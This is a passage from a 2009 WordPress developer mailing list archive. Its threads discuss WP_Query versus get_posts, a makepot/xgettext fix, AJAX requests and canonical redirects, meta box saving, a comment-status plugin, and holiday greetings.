> comments work. But you have something much more valuable at your disposal:
> the entire source code.
> 
> I'm not suggesting that a tutorial wouldn't help, just that at that level of
> detail, looking at the code is a much faster way to learn how stuff works.
> (Btw, using the Firebug console to follow AJAX requests is priceless.)


I agree with you a fair bit. But also: in particular, tutorials are not a good vehicle for such things and trying to explain all this stuff would take more tutorials/docs than are feasible to produce/maintain. Such is the nature of the beast. But some sort of very rough design document would be a huge boon. There is also of course this list.

Indeed I am ploughing through the code to figure out what?s going on. The nature of web apps makes it just that bit harder, since an action might be performed in JavaScript, or a call to a server script, or a CSS based JavaScript action using jQuery or some such. I use the WebKit console/debugger that comes with Safari and Chrome, which gives me a decent bit of insight into what?s going on. I will see if Firebug can help me more.

Thank you for commenting,

	? ravi


From julioprotzek at gmail.com  Wed Dec 23 20:13:13 2009
From: julioprotzek at gmail.com (Julio Protzek)
Date: Wed, 23 Dec 2009 18:13:13 -0200
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <77ee26030912231213p4a26ec47r84937c675bd8a2fc@mail.gmail.com>

2009/12/11 Matt Mullenweg <m at mullenweg.com>
>
>
> What do you wish you had when you first started developing for WordPress?
>

- A complete tutorial step by step for developers on how to create
templates.
- A video tutorial (peepcode style) of 60min to 120min teaching how to
create a template for a website.

Actually I think the WP documentation is pretty good. I got very fluent in
WP (even to create my on plugins) in two weeks.

One thing deserves attention: the documentation homepage has dozens of links
but only three or four are really important to professional developers.

From jer at simianuprising.com  Wed Dec 23 20:20:24 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 23 Dec 2009 15:20:24 -0500
Subject: [wp-hackers] new WP_Query vs. get_posts() - any difference?
In-Reply-To: <674b4a3b0912231014g53e1497eq809c8fb3e2f23483@mail.gmail.com>
References: <9aa12a490912230810t72502e4cib47d93adc34206e7@mail.gmail.com>
	<674b4a3b0912230827p4f5af712l323ae760e51f60ff@mail.gmail.com>
	<9aa12a490912231006w6ac6a438k2a0c0fc8207e10bd@mail.gmail.com>
	<674b4a3b0912231014g53e1497eq809c8fb3e2f23483@mail.gmail.com>
Message-ID: <e1202cb10912231220l1af95118v33e5c8c58e08bb13@mail.gmail.com>

On Wed, Dec 23, 2009 at 1:14 PM, Austin Matzko <austin at ilfilosofo.com> wrote:
> On Wed, Dec 23, 2009 at 12:06 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>> So if I just add suppress_filters=0 into get_posts() it will make
>> those two approaches identical?

They won't be identical because the data contained in the variable
($posts or $query) is very very different. When you do get_posts() you
get an array of posts only, when you do new WP_Query() you get a much
more complicated object full of information about the query and its
results. Things like the current paged value, the number of total
available results/total potential pages. Do a print_r() of the results
of WP_Query() to see what I mean.

I prefer using new WP_Query because I like having access to that stuff
directly, and using get_posts you give up all that info. A lot of it
would be available using general functions if you ran query_posts()
which resets the main query for the whole page, but can still be
useful on your mini-loops and is missing if you do get_posts().

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From jayarjo at gmail.com  Wed Dec 23 20:34:27 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Thu, 24 Dec 2009 00:34:27 +0400
Subject: [wp-hackers] new WP_Query vs. get_posts() - any difference?
In-Reply-To: <e1202cb10912231220l1af95118v33e5c8c58e08bb13@mail.gmail.com>
References: <9aa12a490912230810t72502e4cib47d93adc34206e7@mail.gmail.com>
	<674b4a3b0912230827p4f5af712l323ae760e51f60ff@mail.gmail.com>
	<9aa12a490912231006w6ac6a438k2a0c0fc8207e10bd@mail.gmail.com>
	<674b4a3b0912231014g53e1497eq809c8fb3e2f23483@mail.gmail.com>
	<e1202cb10912231220l1af95118v33e5c8c58e08bb13@mail.gmail.com>
Message-ID: <9aa12a490912231234l3cf778c7o62fff8d12b0db621@mail.gmail.com>

Is there any benefit of running get_posts(), for example can it be
more efficient, since it doesn't retrieve all that additional info? Or
it is the same, since as  Austin said it instantiates WP_Query?

On Thu, Dec 24, 2009 at 12:20 AM, Jeremy Clarke <jer at simianuprising.com> wrote:
> On Wed, Dec 23, 2009 at 1:14 PM, Austin Matzko <austin at ilfilosofo.com> wrote:
>> On Wed, Dec 23, 2009 at 12:06 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>>> So if I just add suppress_filters=0 into get_posts() it will make
>>> those two approaches identical?
>
> They won't be identical because the data contained in the variable
> ($posts or $query) is very very different. When you do get_posts() you
> get an array of posts only, when you do new WP_Query() you get a much
> more complicated object full of information about the query and its
> results. Things like the current paged value, the number of total
> available results/total potential pages. Do a print_r() of the results
> of WP_Query() to see what I mean.
>
> I prefer using new WP_Query because I like having access to that stuff
> directly, and using get_posts you give up all that info. A lot of it
> would be available using general functions if you ran query_posts()
> which resets the main query for the whole page, but can still be
> useful on your mini-loops and is missing if you do get_posts().
>
> --
> Jeremy Clarke | http://jeremyclarke.org
> Code and Design | http://globalvoicesonline.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From scribu at gmail.com  Wed Dec 23 21:07:00 2009
From: scribu at gmail.com (scribu)
Date: Wed, 23 Dec 2009 23:07:00 +0200
Subject: [wp-hackers] new WP_Query vs. get_posts() - any difference?
In-Reply-To: <9aa12a490912231234l3cf778c7o62fff8d12b0db621@mail.gmail.com>
References: <9aa12a490912230810t72502e4cib47d93adc34206e7@mail.gmail.com>
	<674b4a3b0912230827p4f5af712l323ae760e51f60ff@mail.gmail.com>
	<9aa12a490912231006w6ac6a438k2a0c0fc8207e10bd@mail.gmail.com>
	<674b4a3b0912231014g53e1497eq809c8fb3e2f23483@mail.gmail.com>
	<e1202cb10912231220l1af95118v33e5c8c58e08bb13@mail.gmail.com>
	<9aa12a490912231234l3cf778c7o62fff8d12b0db621@mail.gmail.com>
Message-ID: <349fe48b0912231307t3cd2f384k2aa13a6b46826557@mail.gmail.com>

On the performance part, it actually has a little overhead, since there's an
extra function call made.

Obviously, you should use get_posts() when you don't need all the extra
query info, just the post data, without having to do a SELECT manually. It's
just a convenience function.


On Wed, Dec 23, 2009 at 10:34 PM, Davit Barbakadze <jayarjo at gmail.com>wrote:

> Is there any benefit of running get_posts(), for example can it be
> more efficient, since it doesn't retrieve all that additional info? Or
> it is the same, since as  Austin said it instantiates WP_Query?
>


-- 
http://scribu.net

From nb at nikolay.bg  Wed Dec 23 21:16:37 2009
From: nb at nikolay.bg (Nikolay Bachiyski)
Date: Wed, 23 Dec 2009 23:16:37 +0200
Subject: [wp-hackers] i18n problem:xgettext: unrecognized option
	`--package-name='
In-Reply-To: <9aa12a490912210713ge64b8d1of2835c0131014e64@mail.gmail.com>
References: <9aa12a490912210713ge64b8d1of2835c0131014e64@mail.gmail.com>
Message-ID: <87e663fa0912231316y4fe78ef2u4f9409f0456089a7@mail.gmail.com>

On Mon, Dec 21, 2009 at 17:13, Davit Barbakadze <jayarjo at gmail.com> wrote:
> ...
> php makepot.php wp-plugin your-plugin-directory (I use w-plugin switch
> since I could not find a switch for themes)
>

There is a wp-theme project. Type php makepot.php to see them all.

> I get this:
>
> xgettext: unrecognized option `--package-name='
> Try `xgettext --help' for more information.
> Couldn't generate POT file!
>
> Any solution to this?
>

Until recently (a couple of hours) makepot.php used xgettext arguments
to fill in some meta information. Unfortunately some of these
functionality isn't available to older xgettext version. That's why if
you svn up yo the latest version of makepot.php you'll see that the
problem is gone. All metadata is just substituted in the generated POT
file.

Happy hacking,
Nikolay.

From jayarjo at gmail.com  Wed Dec 23 21:24:42 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Thu, 24 Dec 2009 01:24:42 +0400
Subject: [wp-hackers] i18n problem:xgettext: unrecognized option
	`--package-name='
In-Reply-To: <87e663fa0912231316y4fe78ef2u4f9409f0456089a7@mail.gmail.com>
References: <9aa12a490912210713ge64b8d1of2835c0131014e64@mail.gmail.com>
	<87e663fa0912231316y4fe78ef2u4f9409f0456089a7@mail.gmail.com>
Message-ID: <9aa12a490912231324p5879c2e3ub16e70c59402f1f2@mail.gmail.com>

Hm...

I thought I did latest svn from trunk - there is only one svn address
stated on this page:
http://codex.wordpress.org/I18n_for_WordPress_Developers and I do got
a latest xgettext package, for sure. Does it work for you?

On Thu, Dec 24, 2009 at 1:16 AM, Nikolay Bachiyski <nb at nikolay.bg> wrote:
> On Mon, Dec 21, 2009 at 17:13, Davit Barbakadze <jayarjo at gmail.com> wrote:
>> ...
>> php makepot.php wp-plugin your-plugin-directory (I use w-plugin switch
>> since I could not find a switch for themes)
>>
>
> There is a wp-theme project. Type php makepot.php to see them all.
>
>> I get this:
>>
>> xgettext: unrecognized option `--package-name='
>> Try `xgettext --help' for more information.
>> Couldn't generate POT file!
>>
>> Any solution to this?
>>
>
> Until recently (a couple of hours) makepot.php used xgettext arguments
> to fill in some meta information. Unfortunately some of these
> functionality isn't available to older xgettext version. That's why if
> you svn up yo the latest version of makepot.php you'll see that the
> problem is gone. All metadata is just substituted in the generated POT
> file.
>
> Happy hacking,
> Nikolay.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From nb at nikolay.bg  Wed Dec 23 21:44:23 2009
From: nb at nikolay.bg (Nikolay Bachiyski)
Date: Wed, 23 Dec 2009 23:44:23 +0200
Subject: [wp-hackers] i18n problem:xgettext: unrecognized option
	`--package-name='
In-Reply-To: <9aa12a490912231324p5879c2e3ub16e70c59402f1f2@mail.gmail.com>
References: <9aa12a490912210713ge64b8d1of2835c0131014e64@mail.gmail.com> 
	<87e663fa0912231316y4fe78ef2u4f9409f0456089a7@mail.gmail.com> 
	<9aa12a490912231324p5879c2e3ub16e70c59402f1f2@mail.gmail.com>
Message-ID: <87e663fa0912231344k3c866d73k704f35dc46b3a8af@mail.gmail.com>

On Wed, Dec 23, 2009 at 23:24, Davit Barbakadze <jayarjo at gmail.com> wrote:
> Hm...
>
> I thought I did latest svn from trunk - there is only one svn address
> stated on this page:
> http://codex.wordpress.org/I18n_for_WordPress_Developers and I do got
> a latest xgettext package, for sure. Does it work for you?
>

I fixed the issue a couple of hours ago, so it's understandable it
didn't work before.

Is there any difference now? Do you still get the error? What version
of xgettext are you using?

Happy hacking,
Nikolay.

From ravi-lists at g8o.net  Thu Dec 24 01:10:39 2009
From: ravi-lists at g8o.net (Ravi Narayan Sarma)
Date: Wed, 23 Dec 2009 20:10:39 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <16B940ED-CDFA-431B-8CA9-8A5E119E5835@g8o.net>
References: <4B22AD95.8040401@mullenweg.com>
	<90F94996-130F-4CA3-A9FB-21C00D0017E9@g8o.net>
	<349fe48b0912221456r6cfba522g91ed36953640e9a@mail.gmail.com>
	<16B940ED-CDFA-431B-8CA9-8A5E119E5835@g8o.net>
Message-ID: <76EDFF79-142A-409E-8ECE-D847C8D7433C@g8o.net>


Another one from current experience: I am writing a plugin to extend comment administration to let the user mark a comment as [todo], [replied], [ignore]. In the AJAX handler I want to first check that the caller has the permissions to do this (I think ?edit_posts? is what I should be checking for, but please let me know). I asked the Googles (search terms like: "wordpress function to check user rights or permissions? and shorter or more generic versions of this string). Searching through the Codex didn?t find anything either.

Somewhere in depths of the Roles and Capabilities Codex page or in the WP sources (I forget which came first), I found a reference to ?current_user_can()?. This is what I think I should be using. But in my admittedly inexpert searching through the Codex I could neither find anything listing or description of this function. Nor does a Google search yield much apart from the xref. If indeed I have not missed something staring me in the eye (which is quite possible), then I think this is an example of one of the issues facing plugin/theme developers.

Additionally, given the significance of security, should there be a Codex page dedicated to educating plugin/theme developers of the kids of security lapses they could easily create and what steps to keep in mind to avoid them?

2 more cents,

	?ravi


From jayarjo at gmail.com  Thu Dec 24 08:32:13 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Thu, 24 Dec 2009 12:32:13 +0400
Subject: [wp-hackers] i18n problem:xgettext: unrecognized option
	`--package-name='
In-Reply-To: <87e663fa0912231344k3c866d73k704f35dc46b3a8af@mail.gmail.com>
References: <9aa12a490912210713ge64b8d1of2835c0131014e64@mail.gmail.com>
	<87e663fa0912231316y4fe78ef2u4f9409f0456089a7@mail.gmail.com>
	<9aa12a490912231324p5879c2e3ub16e70c59402f1f2@mail.gmail.com>
	<87e663fa0912231344k3c866d73k704f35dc46b3a8af@mail.gmail.com>
Message-ID: <9aa12a490912240032x64542c0fmd30ef7fec21d6fa@mail.gmail.com>

Ah, I see. I will try now. But why this ambiguity, is it used so rare,
that no one noticed it before? I thought it should be a popular
script.

On Thu, Dec 24, 2009 at 1:44 AM, Nikolay Bachiyski <nb at nikolay.bg> wrote:
> On Wed, Dec 23, 2009 at 23:24, Davit Barbakadze <jayarjo at gmail.com> wrote:
>> Hm...
>>
>> I thought I did latest svn from trunk - there is only one svn address
>> stated on this page:
>> http://codex.wordpress.org/I18n_for_WordPress_Developers and I do got
>> a latest xgettext package, for sure. Does it work for you?
>>
>
> I fixed the issue a couple of hours ago, so it's understandable it
> didn't work before.
>
> Is there any difference now? Do you still get the error? What version
> of xgettext are you using?
>
> Happy hacking,
> Nikolay.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From nb at nikolay.bg  Thu Dec 24 12:17:55 2009
From: nb at nikolay.bg (Nikolay Bachiyski)
Date: Thu, 24 Dec 2009 14:17:55 +0200
Subject: [wp-hackers] i18n problem:xgettext: unrecognized option
	`--package-name='
In-Reply-To: <9aa12a490912240032x64542c0fmd30ef7fec21d6fa@mail.gmail.com>
References: <9aa12a490912210713ge64b8d1of2835c0131014e64@mail.gmail.com> 
	<87e663fa0912231316y4fe78ef2u4f9409f0456089a7@mail.gmail.com> 
	<9aa12a490912231324p5879c2e3ub16e70c59402f1f2@mail.gmail.com> 
	<87e663fa0912231344k3c866d73k704f35dc46b3a8af@mail.gmail.com> 
	<9aa12a490912240032x64542c0fmd30ef7fec21d6fa@mail.gmail.com>
Message-ID: <87e663fa0912240417q38f08467x675e22fe16324a2d@mail.gmail.com>

On Thu, Dec 24, 2009 at 10:32, Davit Barbakadze <jayarjo at gmail.com> wrote:
> Ah, I see. I will try now. But why this ambiguity, is it used so rare,
> that no one noticed it before? I thought it should be a popular
> script.
>

It wasn't a big problem because most of the people had newer version
of xgettext. Also, it used to have an option to disable usage of
advanced xgettext arguments. In the end I decided it was better to
make it just work and not depend on xgettext so much.

Happy hacking,
Nikolay.

From dylankkuhn at gmail.com  Thu Dec 24 19:08:52 2009
From: dylankkuhn at gmail.com (Dylan Kuhn)
Date: Thu, 24 Dec 2009 12:08:52 -0700
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <161617690912110927k6af7fd83j914ea3ed6b029b4f@mail.gmail.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com> 
	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com> 
	<26393151.post@talk.nabble.com>
	<9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com> 
	<161617690912110927k6af7fd83j914ea3ed6b029b4f@mail.gmail.com>
Message-ID: <e7471da80912241108l72c96a51x14a715fac44655de@mail.gmail.com>

> That said, you can always use the init or the template_redirect action
> to do AJAX requests to the main blog URL instead of going through the
> explicit admin-ajax code.

Largely inspired by Otto's suggestions, I attempted to make an AJAX
interface that would work on the front end using template_redirect. In
my testing with WP 2.8.6, I found that POST requests done this way
would get a 301 response, which would redirect to a GET on the same
URL (of course now without the POST data). Anyone know of core code
that might do that?

cheers,
-dylan-

From dylankkuhn at gmail.com  Thu Dec 24 19:53:28 2009
From: dylankkuhn at gmail.com (Dylan Kuhn)
Date: Thu, 24 Dec 2009 12:53:28 -0700
Subject: [wp-hackers] Handling Custom Meta Boxes
In-Reply-To: <4B26B559.3030408@voceconnect.com>
References: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no> 
	<161617690912140646na98c5e4y9042f435b05fc5fb@mail.gmail.com> 
	<op.u4x6varuspxmuu@dd32> <4B26B559.3030408@voceconnect.com>
Message-ID: <e7471da80912241153i20129f15g30531f5bac3f62f0@mail.gmail.com>

> I'm curious how most plugin developers handle saving settings from custom
> post meta_boxes. ?I've always handled this by adding an action to save the
> result on 'save_post' and only updating if DOING_AUTOSAVE wasn't defined.
> ?The problem with doing this, is that the save_post action is also called
> when a scheduled item is moved to published. ?If this happens, the posted
> values from the meta_box isn't available and I can't alway use isset since
> that means I can never use checkboxes for input.

I find it helpful sometimes to have an input of type="hidden", which
allows me to use isset() to determine if data from my meta box is
included in the posted data.

-dylan-

From scribu at gmail.com  Thu Dec 24 20:07:28 2009
From: scribu at gmail.com (scribu)
Date: Thu, 24 Dec 2009 22:07:28 +0200
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <e7471da80912241108l72c96a51x14a715fac44655de@mail.gmail.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com>
	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com>
	<26393151.post@talk.nabble.com>
	<9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>
	<161617690912110927k6af7fd83j914ea3ed6b029b4f@mail.gmail.com>
	<e7471da80912241108l72c96a51x14a715fac44655de@mail.gmail.com>
Message-ID: <349fe48b0912241207q6b5de104pce1ba9406a514d04@mail.gmail.com>

The canonical redirection code is probably at play here.


On Thu, Dec 24, 2009 at 9:08 PM, Dylan Kuhn <dylankkuhn at gmail.com> wrote:

> Largely inspired by Otto's suggestions, I attempted to make an AJAX
> interface that would work on the front end using template_redirect. In
> my testing with WP 2.8.6, I found that POST requests done this way
> would get a 301 response, which would redirect to a GET on the same
> URL (of course now without the POST data). Anyone know of core code
> that might do that?
>

-- 
http://scribu.net

From ravi-lists at g8o.net  Fri Dec 25 00:06:45 2009
From: ravi-lists at g8o.net (Ravi Narayan Sarma)
Date: Thu, 24 Dec 2009 19:06:45 -0500
Subject: [wp-hackers] Extending comment filter in comments admin
Message-ID: <46BB4884-0BDE-4928-BE78-19DE0A7EE634@g8o.net>

Hello all,

so I have been struggling along with my ?comment response tracker? plugin; the plan is: in the comments admin page (edit-comments.php) I offer a few options to let the user mark a comment as ?todo?, ?replied? or ?ignore?. Comments that are ?todo? are displayed with some sort of background colouring. Also, the current response status is highlighted among the three choices. That?s all been hacked up to the best of my abilities.

Now, I figured, wouldn?t it be sweet to let the user ?Filter? comments by the response status? Turns out there is a convenient hook ?admin_comment_types_dropdown? that lets me extend the filter options offered to the user. The current set of options (?Comments?, ?Pings?) is passed down to me and I add in ?Todo?, ?Replied?, ?Ignored? to this list. So far so good. But the next step has me stymied. It seems that _wp_get_comment_list() is where the the status criteria is applied, but there seems to be no hook to influence this process. But then, why would there be an ?admin_comment_types_dropdown? hook? Perhaps I am looking in the wrong place.

Well, how about another direction? also available is a ?manage_comments_nav? action to extend this menu. Akismet uses this to add a ?Check for Spam? button. Should I perhaps be following suit, and extend the menu to offer my filtering options, rather than extend the Filter options?

Any suggestions would help alleviate my OCD!

	? ravi


From ozh at planetozh.com  Fri Dec 25 00:15:34 2009
From: ozh at planetozh.com (Ozh)
Date: Fri, 25 Dec 2009 01:15:34 +0100
Subject: [wp-hackers] Off topic...
Message-ID: <ae81acd10912241615l5a519569v8a75483308012651@mail.gmail.com>

Merry xmas fellow hackers :)



-- 
http://planetOzh.com ~ Blog and WordPress Stuff
http://FrenchFragFactory.net ~ Daily Quake News

From mikeschinkel at newclarity.net  Fri Dec 25 00:19:02 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 24 Dec 2009 19:19:02 -0500
Subject: [wp-hackers] Extending comment filter in comments admin
In-Reply-To: <46BB4884-0BDE-4928-BE78-19DE0A7EE634@g8o.net>
References: <46BB4884-0BDE-4928-BE78-19DE0A7EE634@g8o.net>
Message-ID: <9D6A001F-B410-42E7-B8E4-E71C9A21D8A4@newclarity.net>

Sounds like a great plugin Ravi, hope you can get it working.

Happy Holidays hackers!

-Mike

On Dec 24, 2009, at 7:06 PM, Ravi Narayan Sarma wrote:

> Hello all,
> 
> so I have been struggling along with my ?comment response tracker? plugin; the plan is: in the comments admin page (edit-comments.php) I offer a few options to let the user mark a comment as ?todo?, ?replied? or ?ignore?. Comments that are ?todo? are displayed with some sort of background colouring. Also, the current response status is highlighted among the three choices. That?s all been hacked up to the best of my abilities.
> 
> Now, I figured, wouldn?t it be sweet to let the user ?Filter? comments by the response status? Turns out there is a convenient hook ?admin_comment_types_dropdown? that lets me extend the filter options offered to the user. The current set of options (?Comments?, ?Pings?) is passed down to me and I add in ?Todo?, ?Replied?, ?Ignored? to this list. So far so good. But the next step has me stymied. It seems that _wp_get_comment_list() is where the the status criteria is applied, but there seems to be no hook to influence this process. But then, why would there be an ?admin_comment_types_dropdown? hook? Perhaps I am looking in the wrong place.
> 
> Well, how about another direction? also available is a ?manage_comments_nav? action to extend this menu. Akismet uses this to add a ?Check for Spam? button. Should I perhaps be following suit, and extend the menu to offer my filtering options, rather than extend the Filter options?
> 
> Any suggestions would help alleviate my OCD!
> 
> 	? ravi
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From lynne.pope at gmail.com  Fri Dec 25 00:30:24 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Fri, 25 Dec 2009 13:30:24 +1300
Subject: [wp-hackers] Off topic...
In-Reply-To: <ae81acd10912241615l5a519569v8a75483308012651@mail.gmail.com>
References: <ae81acd10912241615l5a519569v8a75483308012651@mail.gmail.com>
Message-ID: <427667db0912241630r1b48473bka0c9ebaab37a0f6b@mail.gmail.com>

Merry Christmas to you too Ozh, and Seasons Greetings to everyone.
May your holiday season be filled with the open source spirit of giving and
sharing.

Cheers,
Lynne

2009/12/25 Ozh <ozh at planetozh.com>

> Merry xmas fellow hackers :)
>
>
>
> --
> http://planetOzh.com ~ Blog and WordPress Stuff
> http://FrenchFragFactory.net ~ Daily Quake News
>


-- 
http://twitter.com/elpie/

From lists at rotorised.com  Fri Dec 25 00:34:27 2009
From: lists at rotorised.com (Ryan McCue)
Date: Fri, 25 Dec 2009 10:34:27 +1000
Subject: [wp-hackers] Off topic...
In-Reply-To: <427667db0912241630r1b48473bka0c9ebaab37a0f6b@mail.gmail.com>
References: <ae81acd10912241615l5a519569v8a75483308012651@mail.gmail.com>
	<427667db0912241630r1b48473bka0c9ebaab37a0f6b@mail.gmail.com>
Message-ID: <4B340893.3040500@rotorised.com>

Happy Festivus to everyone as well. I look forward to the Airing of 
Grievances, though personally my favourite part is the Feats of Strength. :)

-- 
Ryan McCue
<http://ryanmccue.info/>


From dylankkuhn at gmail.com  Fri Dec 25 04:58:16 2009
From: dylankkuhn at gmail.com (Dylan Kuhn)
Date: Thu, 24 Dec 2009 21:58:16 -0700
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <349fe48b0912241207q6b5de104pce1ba9406a514d04@mail.gmail.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com> 
	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com> 
	<26393151.post@talk.nabble.com>
	<9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com> 
	<161617690912110927k6af7fd83j914ea3ed6b029b4f@mail.gmail.com> 
	<e7471da80912241108l72c96a51x14a715fac44655de@mail.gmail.com> 
	<349fe48b0912241207q6b5de104pce1ba9406a514d04@mail.gmail.com>
Message-ID: <e7471da80912242058p167bc3cfn39aa552df4c24028@mail.gmail.com>

> The canonical redirection code is probably at play here.

Thanks for the hint - I think you are probably right, and that I had a
bug in my POST request. When I tried to reproduce the problem,
thinking I would spit out some useful debugging information from
redirect_canonical(), it worked.  But I was happy to see this code
there, which should let any POST request with data through:

function redirect_canonical($requested_url=null, $do_redirect=true) {
	global $wp_rewrite, $is_IIS, $wp_query, $wpdb;

	if ( is_trackback() || is_search() || is_comments_popup() ||
is_admin() || $is_IIS || ( isset($_POST) && count($_POST) ) ||
is_preview() || is_robots() )
		return;


-dylan-

From wordpress at dd32.id.au  Fri Dec 25 05:06:32 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Fri, 25 Dec 2009 16:06:32 +1100
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <e7471da80912242058p167bc3cfn39aa552df4c24028@mail.gmail.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com>
	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com>
	<26393151.post@talk.nabble.com>
	<9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>
	<161617690912110927k6af7fd83j914ea3ed6b029b4f@mail.gmail.com>
	<e7471da80912241108l72c96a51x14a715fac44655de@mail.gmail.com>
	<349fe48b0912241207q6b5de104pce1ba9406a514d04@mail.gmail.com>
	<e7471da80912242058p167bc3cfn39aa552df4c24028@mail.gmail.com>
Message-ID: <op.u5g9s2uyspxmuu@dd32>

Open a trac ticket at http://core.trac.wordpress.org/newticket with your  
request :)

On Fri, 25 Dec 2009 15:58:16 +1100, Dylan Kuhn <dylankkuhn at gmail.com>  
wrote:

>> The canonical redirection code is probably at play here.
>
> Thanks for the hint - I think you are probably right, and that I had a
> bug in my POST request. When I tried to reproduce the problem,
> thinking I would spit out some useful debugging information from
> redirect_canonical(), it worked.  But I was happy to see this code
> there, which should let any POST request with data through:
>
> function redirect_canonical($requested_url=null, $do_redirect=true) {
> 	global $wp_rewrite, $is_IIS, $wp_query, $wpdb;
>
> 	if ( is_trackback() || is_search() || is_comments_popup() ||
> is_admin() || $is_IIS || ( isset($_POST) && count($_POST) ) ||
> is_preview() || is_robots() )
> 		return;
>
>
> -dylan-
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From dylankkuhn at gmail.com  Fri Dec 25 14:18:08 2009
From: dylankkuhn at gmail.com (Dylan Kuhn)
Date: Fri, 25 Dec 2009 07:18:08 -0700
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <op.u5g9s2uyspxmuu@dd32>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com> 
	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com> 
	<26393151.post@talk.nabble.com>
	<9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com> 
	<161617690912110927k6af7fd83j914ea3ed6b029b4f@mail.gmail.com> 
	<e7471da80912241108l72c96a51x14a715fac44655de@mail.gmail.com> 
	<349fe48b0912241207q6b5de104pce1ba9406a514d04@mail.gmail.com> 
	<e7471da80912242058p167bc3cfn39aa552df4c24028@mail.gmail.com> 
	<op.u5g9s2uyspxmuu@dd32>
Message-ID: <e7471da80912250618q47b8a2cekb463cb485c622f05@mail.gmail.com>

Sorry, my previous response was poorly written. For anyone else
experiencing this problem: I was _not_ able to reproduce it when I
tried again. The snippet of code I included is _already_ in WP 2.8.6
(and earlier, I think), and should prevent redirect_canonical() from
redirecting POST requests that actually have data. So I can only
speculate about what was causing the 301 I originally observed.

-dylan-

On Thu, Dec 24, 2009 t 10:06 PM, Dion Hulse (dd32) <wordpress at dd32.id.au> wrote:
> Open a trac ticket at http://core.trac.wordpress.org/newticket with your
> request :)
>
> On Fri, 25 Dec 2009 15:58:16 +1100, Dylan Kuhn <dylankkuhn at gmail.com> wrote:
>
>>> The canonical redirection code is probably at play here.
>>
>> Thanks for the hint - I think you are probably right, and that I had a
>> bug in my POST request. When I tried to reproduce the problem,
>> thinking I would spit out some useful debugging information from
>> redirect_canonical(), it worked. ?But I was happy to see this code
>> there, which should let any POST request with data through:
>>
>> function redirect_canonical($requested_url=null, $do_redirect=true) {
>> ? ? ? ?global $wp_rewrite, $is_IIS, $wp_query, $wpdb;
>>
>> ? ? ? ?if ( is_trackback() || is_search() || is_comments_popup() ||
>> is_admin() || $is_IIS || ( isset($_POST) && count($_POST) ) ||
>> is_preview() || is_robots() )
>> ? ? ? ? ? ? ? ?return;
>>

From jayarjo at gmail.com  Fri Dec 25 15:51:17 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 25 Dec 2009 19:51:17 +0400
Subject: [wp-hackers] any plugin for keyword hint database?
Message-ID: <9aa12a490912250751u54e7b71dped264d288fc76f3c@mail.gmail.com>

First of all Merry Christhmas to everyone :) Let it be a start of
everything good!

What we'd like to have is a little popup on keyword mouseover. Right
now we use tippy, it generally does the same, but one has to insert
the text of the popup in a special shortcode along with the keyword.
It is not a very flexible solution, since if we want to highlight the
same keyword in different post, we got to repeat the whole procedure
again. Is there any established solution or plugin, which has all
popup text vs keyword associations stored in one centralized place and
automatically inserts these in post content, where necessary? It would
be logical to store popup texts as custom post types for example, or
just posts from special category.

-- 
Davit Barbakadze

From scribu at gmail.com  Fri Dec 25 16:02:11 2009
From: scribu at gmail.com (scribu)
Date: Fri, 25 Dec 2009 18:02:11 +0200
